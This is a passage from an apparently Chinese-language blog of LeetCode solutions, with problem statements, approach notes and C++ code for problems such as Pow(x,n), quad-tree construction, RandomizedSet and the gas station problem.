class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=digits.<span class="built_in">size</span>()<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(++digits[i]&lt;<span class="number">10</span>)<span class="keyword">return</span> digits;</span><br><span class="line">            digits[i]-=<span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt;<span class="built_in">result</span>(n+<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">        result[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="最后一个单词的长度简单">最后一个单词的长度（简单）</h2><h3 id="题目描述-12">题目描述</h3><p>给你一个字符串<code>s</code>，由若干单词组成，单词前后用一些空格字符隔开。返回字符串中<strong>最后一个</strong> 单词的长度。</p><p><strong>单词</strong>是指仅由字母组成、不包含任何空格字符的最大子字符串。</p><h3 id="思路-11">思路</h3><p>直接从后往前遍历即可</p><h3 id="代码-12">代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">lengthOfLastWord</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> ans=s.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(s[ans]==<span class="string">&#x27; &#x27;</span>)ans--;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=ans;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">            <span class="keyword">if</span>(s[i]==<span class="string">&#x27; &#x27;</span>)<span class="keyword">return</span> ans-i;</span><br><span class="line">        <span class="keyword">return</span> ans+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="powxn中等">Pow(x,n)(中等)</h3><h3 id="题目描述-13">题目描述</h3><p>实现 <a href="https://www.cplusplus.com/reference/valarray/pow/">pow(<em>x</em>,<em>n</em>)</a> ，即计算 <code>x</code> 的整数 <code>n</code>次幂函数（即，<code>xn</code> ）。</p><h3 id="思路-12">思路</h3><p>这里有一个比较坑的点，如果直接一个一个x相乘会超时，所以我采取的是幂不断×2，也就是现在算的幂为2，而要求n是4，直接结果乘结果，这样幂就直接是4了，直到最后不能×2时就用递归</p><h3 id="代码-13">代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">double</span> <span class="title">myPow</span><span class="params">(<span class="type">double</span> x, <span class="type">long</span> <span class="type">long</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> fu=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(n&lt;<span class="number">0</span>)</span><br><span class="line">            fu=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(n==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        n=<span class="built_in">abs</span>(n);</span><br><span class="line">        <span class="type">double</span> ans=x;</span><br><span class="line">        <span class="type">double</span> nowPow=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(n&gt;=nowPow*<span class="number">2</span>)&#123;</span><br><span class="line">            ans*=ans;</span><br><span class="line">            nowPow*=<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(n&gt;=nowPow)&#123;</span><br><span class="line">            ans*=<span class="built_in">myPow</span>(x,n-nowPow);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(fu)ans=<span class="built_in">double</span>(<span class="number">1</span>)/ans;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="建立四叉树中等">建立四叉树（中等）</h3><h3 id="题目描述-14">题目描述</h3><p>给你一个 <code>n * n</code> 矩阵 <code>grid</code> ，矩阵由若干<code>0</code> 和 <code>1</code> 组成。请你用四叉树表示该矩阵<code>grid</code> 。</p><p>你需要返回能表示矩阵 <code>grid</code> 的 四叉树 的根结点。</p><p>四叉树数据结构中，每个内部节点只有四个子节点。此外，每个节点都有两个属性：</p><ul><li><code>val</code>：储存叶子结点所代表的区域的值。1 对应<strong>True</strong>，0 对应 <strong>False</strong>。注意，当<code>isLeaf</code> 为 <strong>False</strong> 时，你可以把<strong>True</strong> 或者 <strong>False</strong>赋值给节点，两种值都会被判题机制 <strong>接受</strong> 。</li><li><code>isLeaf</code>: 当这个节点是一个叶子结点时为<strong>True</strong>，如果它有 4 个子节点则为 <strong>False</strong>。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class Node &#123;</span><br><span class="line">    public boolean val;</span><br><span class="line">    public boolean isLeaf;</span><br><span class="line">    public Node topLeft;</span><br><span class="line">    public Node topRight;</span><br><span class="line">    public Node bottomLeft;</span><br><span class="line">    public Node bottomRight;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以按以下步骤为二维区域构建四叉树：</p><ol type="1"><li>如果当前网格的值相同（即，全为 <code>0</code> 或者全为<code>1</code>），将 <code>isLeaf</code> 设为 True ，将 <code>val</code>设为网格相应的值，并将四个子节点都设为 Null 然后停止。</li><li>如果当前网格的值不同，将 <code>isLeaf</code> 设为 False， 将<code>val</code>设为任意值，然后如下图所示，将当前网格划分为四个子网格。</li><li>使用适当的子网格递归每个子节点。</li></ol><figure><img src="/post/4d65bd11/new_top.png" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><p>如果你想了解更多关于四叉树的内容，可以参考 <a href="https://en.wikipedia.org/wiki/Quadtree">wiki</a> 。</p><p><strong>四叉树格式：</strong></p><p>你不需要阅读本节来解决这个问题。只有当你想了解输出格式时才会这样做。输出为使用层序遍历后四叉树的序列化形式，其中<code>null</code> 表示路径终止符，其下面不存在节点。</p><p>它与二叉树的序列化非常相似。唯一的区别是节点以列表形式表示<code>[isLeaf, val]</code> 。</p><p>如果 <code>isLeaf</code> 或者 <code>val</code> 的值为 True，则表示它在列表 <code>[isLeaf, val]</code> 中的值为 <strong>1</strong>；如果 <code>isLeaf</code> 或者 <code>val</code> 的值为 False，则表示值为 <strong>0</strong> 。</p><p><strong>示例 1：</strong></p><figure><img src="/post/4d65bd11/grid1.png" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入：grid = [[0,1],[1,0]]</span><br><span class="line">输出：[[0,1],[1,0],[1,1],[1,1],[1,0]]</span><br><span class="line">解释：此示例的解释如下：</span><br><span class="line">请注意，在下面四叉树的图示中，0 表示 false，1 表示 True 。</span><br></pre></td></tr></table></figure><h3 id="思路-13">思路</h3><ol type="1"><li>如果该矩阵所有元素都相等，则不需要拆分，直接就是叶子节点</li><li>如果不完全相等，则需要拆分，拆分成四份，再进行判断，用递归方式实现</li></ol><h3 id="代码-14">代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">// Definition for a QuadTree node.</span></span><br><span class="line"><span class="comment">class Node &#123;</span></span><br><span class="line"><span class="comment">public:</span></span><br><span class="line"><span class="comment">    bool val;</span></span><br><span class="line"><span class="comment">    bool isLeaf;</span></span><br><span class="line"><span class="comment">    Node* topLeft;</span></span><br><span class="line"><span class="comment">    Node* topRight;</span></span><br><span class="line"><span class="comment">    Node* bottomLeft;</span></span><br><span class="line"><span class="comment">    Node* bottomRight;</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    Node() &#123;</span></span><br><span class="line"><span class="comment">        val = false;</span></span><br><span class="line"><span class="comment">        isLeaf = false;</span></span><br><span class="line"><span class="comment">        topLeft = NULL;</span></span><br><span class="line"><span class="comment">        topRight = NULL;</span></span><br><span class="line"><span class="comment">        bottomLeft = NULL;</span></span><br><span class="line"><span class="comment">        bottomRight = NULL;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    Node(bool _val, bool _isLeaf) &#123;</span></span><br><span class="line"><span class="comment">        val = _val;</span></span><br><span class="line"><span class="comment">        isLeaf = _isLeaf;</span></span><br><span class="line"><span class="comment">        topLeft = NULL;</span></span><br><span class="line"><span class="comment">        topRight = NULL;</span></span><br><span class="line"><span class="comment">        bottomLeft = NULL;</span></span><br><span class="line"><span class="comment">        bottomRight = NULL;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    Node(bool _val, bool _isLeaf, Node* _topLeft, Node* _topRight, Node* _bottomLeft, Node* _bottomRight) &#123;</span></span><br><span class="line"><span class="comment">        val = _val;</span></span><br><span class="line"><span class="comment">        isLeaf = _isLeaf;</span></span><br><span class="line"><span class="comment">        topLeft = _topLeft;</span></span><br><span class="line"><span class="comment">        topRight = _topRight;</span></span><br><span class="line"><span class="comment">        bottomLeft = _bottomLeft;</span></span><br><span class="line"><span class="comment">        bottomRight = _bottomRight;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">ifAll</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp;grid)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(vector&lt;<span class="type">int</span>&gt;its:grid)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> it:its)&#123;</span><br><span class="line">                <span class="keyword">if</span>(it!=grid[<span class="number">0</span>][<span class="number">0</span>])<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> grid[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">newGridGen</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp;grid,<span class="type">int</span> length,<span class="type">int</span> i,<span class="type">int</span> j)&#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;<span class="built_in">newGrid</span>(length,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(length));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> m=<span class="number">0</span>;m&lt;length;m++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> n=<span class="number">0</span>;n&lt;length;n++)&#123;</span><br><span class="line">                newGrid[m][n]=grid[i+m][j+n];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> newGrid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">Node* <span class="title">construct</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; grid)</span> </span>&#123;</span><br><span class="line">        Node* newNode=<span class="keyword">new</span> <span class="built_in">Node</span>();</span><br><span class="line">        <span class="type">int</span> item=ifAll(grid);</span><br><span class="line">        <span class="keyword">if</span>(item!=<span class="number">-1</span>)&#123;</span><br><span class="line">            newNode-&gt;isLeaf=<span class="literal">true</span>;</span><br><span class="line">            newNode-&gt;val=item;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="type">int</span> length=grid.<span class="built_in">size</span>()/<span class="number">2</span>;</span><br><span class="line">            newNode-&gt;topLeft=<span class="built_in">construct</span>(<span class="built_in">newGridGen</span>(grid,length,<span class="number">0</span>,<span class="number">0</span>));</span><br><span class="line">            newNode-&gt;topRight=<span class="built_in">construct</span>(<span class="built_in">newGridGen</span>(grid,length,<span class="number">0</span>,length));</span><br><span class="line">            newNode-&gt;bottomLeft=<span class="built_in">construct</span>(<span class="built_in">newGridGen</span>(grid,length,length,<span class="number">0</span>));</span><br><span class="line">            newNode-&gt;bottomRight=<span class="built_in">construct</span>(<span class="built_in">newGridGen</span>(grid,length,length,length));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> newNode;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="删除排序链表中的重复元素ⅱ中等">删除排序链表中的重复元素Ⅱ（中等）</h2><h3 id="题目描述-15">题目描述</h3><p>给定一个已排序的链表的头 <code>head</code> ，<em>删除原始链表中所有重复数字的节点，只留下不同的数字</em> 。返回<em>已排序的链表</em> 。</p><p><strong>示例 1：</strong></p><figure><img src="/post/4d65bd11/linkedlist1.jpg" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：head = [1,2,3,3,4,4,5]</span><br><span class="line">输出：[1,2,5]</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure><img src="/post/4d65bd11/linkedlist2.jpg" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：head = [1,1,1,2,3]</span><br><span class="line">输出：[2,3]</span><br></pre></td></tr></table></figure><h3 id="思路-14">思路</h3><p>在head前再设置一个节点，pre从该节点开始记录，now从head的原始头节点开始记录，如果now和now-&gt;next的值相同now就向后走，直到不等，这时now还需要往后走一格，因为now此时还是和前一个节点值相等，接着再和next进行比较，直到now既不和前节点值相同也不和后节点值相同，pre的next就指向now，now就往后走</p><h3 id="代码-15">代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">deleteDuplicates</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        ListNode* pre=<span class="keyword">new</span> <span class="built_in">ListNode</span>();</span><br><span class="line">        pre-&gt;next=head;</span><br><span class="line">        ListNode*now=head;</span><br><span class="line">        head=pre;</span><br><span class="line">        <span class="keyword">while</span>(now)&#123;</span><br><span class="line">            <span class="keyword">while</span>(now&amp;&amp;now-&gt;next&amp;&amp;now-&gt;val==now-&gt;next-&gt;val)&#123;</span><br><span class="line">                <span class="keyword">while</span>(now&amp;&amp;now-&gt;next&amp;&amp;now-&gt;val==now-&gt;next-&gt;val)&#123;</span><br><span class="line">                    now=now-&gt;next;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(now)&#123;</span><br><span class="line">                    now=now-&gt;next;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            pre-&gt;next=now;</span><br><span class="line">            pre=pre-&gt;next;</span><br><span class="line">            <span class="keyword">if</span>(now)&#123;</span><br><span class="line">                now=now-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="单词搜索困难待做">单词搜索（困难）（待做）</h2><h2 id="o1-时间插入删除和获取随机元素中等">O(1)时间插入、删除和获取随机元素（中等）</h2><h3 id="题目描述-16">题目描述</h3><p>实现<code>RandomizedSet</code> 类：</p><ul><li><code>RandomizedSet()</code> 初始化 <code>RandomizedSet</code>对象</li><li><code>bool insert(int val)</code> 当元素 <code>val</code>不存在时，向集合中插入该项，并返回 <code>true</code> ；否则，返回<code>false</code> 。</li><li><code>bool remove(int val)</code> 当元素 <code>val</code>存在时，从集合中移除该项，并返回 <code>true</code> ；否则，返回<code>false</code> 。</li><li><code>int getRandom()</code>随机返回现有集合中的一项（测试用例保证调用此方法时集合中至少存在一个元素）。每个元素应该有<strong>相同的概率</strong> 被返回。</li></ul><p>你必须实现类的所有函数，并满足每个函数的 <strong>平均</strong>时间复杂度为 <code>O(1)</code> 。</p><h3 id="知识点-2">知识点</h3><ol type="1"><li><p>生成随机索引</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;random&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_set&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::unordered_set&lt;<span class="type">char</span>&gt; charSet = &#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>&#125;;</span><br><span class="line">    <span class="keyword">if</span> (!charSet.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        <span class="comment">// 设置随机数生成器</span></span><br><span class="line">        std::random_device rd;</span><br><span class="line">        <span class="function">std::mt19937 <span class="title">gen</span><span class="params">(rd())</span></span>;</span><br><span class="line">        <span class="function">std::uniform_int_distribution&lt;<span class="type">int</span>&gt; <span class="title">dist</span><span class="params">(<span class="number">0</span>, charSet.size() - <span class="number">1</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> randomIndex = <span class="built_in">dist</span>(gen); <span class="comment">// 生成随机索引</span></span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;随机索引: &quot;</span> &lt;&lt; randomIndex &lt;&lt; std::endl;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;集合为空，无法生成随机索引&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>移动迭代器到哈希列表指定位置：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> it = sets.<span class="built_in">begin</span>();</span><br><span class="line"> <span class="built_in">advance</span>(it, randomIndex); <span class="comment">// 移动迭代器到随机位置</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="思路-15">思路</h3><p>利用哈希列表查询元素的1复杂度和用随机数生成随机索引</p><h3 id="代码-16">代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">RandomizedSet</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    unordered_set&lt;<span class="type">int</span>&gt; sets;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">RandomizedSet</span>() &#123;</span><br><span class="line">        <span class="built_in">srand</span>((<span class="type">unsigned</span>)<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line">     &#125;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">insert</span><span class="params">(<span class="type">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (sets.<span class="built_in">find</span>(val) == sets.<span class="built_in">end</span>()) &#123;</span><br><span class="line">            sets.<span class="built_in">insert</span>(val);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">remove</span><span class="params">(<span class="type">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (sets.<span class="built_in">find</span>(val) != sets.<span class="built_in">end</span>()) &#123;</span><br><span class="line">            sets.<span class="built_in">erase</span>(val);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getRandom</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> randomIndex = <span class="built_in">rand</span>()%sets.<span class="built_in">size</span>();; <span class="comment">// 生成随机索引</span></span><br><span class="line">        <span class="keyword">auto</span> it = sets.<span class="built_in">begin</span>();</span><br><span class="line">        <span class="built_in">advance</span>(it, randomIndex); <span class="comment">// 移动迭代器到随机位置</span></span><br><span class="line">        <span class="keyword">return</span> *it;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="加油站中等">加油站（中等）</h2><h3 id="题目描述-17">题目描述</h3><p>在一条环路上有 <code>n</code> 个加油站，其中第 <code>i</code>个加油站有汽油 <code>gas[i]</code> 升。</p><p>你有一辆油箱容量无限的的汽车，从第 <code>i</code> 个加油站开往第<code>i+1</code> 个加油站需要消耗汽油 <code>cost[i]</code>升。你从其中的一个加油站出发，开始时油箱为空。</p><p>给定两个整数数组 <code>gas</code> 和 <code>cost</code>，如果你可以按顺序绕环路行驶一周，则返回出发时加油站的编号，否则返回<code>-1</code> 。如果存在解，则 <strong>保证</strong> 它是<strong>唯一</strong> 的。</p><p><strong>示例 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">输入: gas = [1,2,3,4,5], cost = [3,4,5,1,2]</span><br><span class="line">输出: 3</span><br><span class="line">解释:</span><br><span class="line">从 3 号加油站(索引为 3 处)出发，可获得 4 升汽油。此时油箱有 = 0 + 4 = 4 升汽油</span><br><span class="line">开往 4 号加油站，此时油箱有 4 - 1 + 5 = 8 升汽油</span><br><span class="line">开往 0 号加油站，此时油箱有 8 - 2 + 1 = 7 升汽油</span><br><span class="line">开往 1 号加油站，此时油箱有 7 - 3 + 2 = 6 升汽油</span><br><span class="line">开往 2 号加油站，此时油箱有 6 - 4 + 3 = 5 升汽油</span><br><span class="line">开往 3 号加油站，你需要消耗 5 升汽油，正好足够你返回到 3 号加油站。</span><br><span class="line">因此，3 可为起始索引。</span><br></pre></td></tr></table></figure><h3 id="思路-16">思路</h3><p>这里我进行了循环，整个循环需要走三步</p><ol type="1"><li>首先找到第一个gas[i]大于cost[i]的点，这样的点才能作为起点，start定在该点，end为start+1，余额就是gas[start]-cost[start]</li><li>从该点开始，余额加上gas[end]-cost[end]，如果大于等于0，end就往后移，余额继续加</li><li>如果end已经返回到了start，此时分两种情况<ol type="1"><li>余额大于0，说明该轮成功，直接返回start的值</li><li>余额小于0，说明该轮失败，整体就不可能成功，因为最终的余额肯定就是这个值，只是中间的值会不一样</li></ol></li><li>如果end没有返回到start，此时的余额已经比0小了，start就需要往前移，余额就减去该点加的，直到余额大于0，end才继续后移</li><li>如果start移到了end，此时就需要再往后找符合gas[i]&gt;=cost[i]的点</li></ol><p>直到start遍历过所有点都没有找到的话，就说明失败了，就直接返回-1</p><h3 id="代码-17">代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 